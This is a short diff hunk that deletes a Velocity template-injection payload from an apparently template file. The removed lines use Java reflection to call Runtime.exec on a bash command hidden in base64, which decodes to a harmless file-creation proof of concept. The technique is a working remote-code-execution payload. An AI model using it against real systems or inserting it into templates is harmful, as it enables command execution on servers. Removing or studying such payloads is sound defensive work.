@@ -1,2 +1,0 @@
-#set($e="e")
-$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("bash -c '{echo,dG91Y2ggUkVhRE1F}|{base64,-d}|{bash,-i}'")
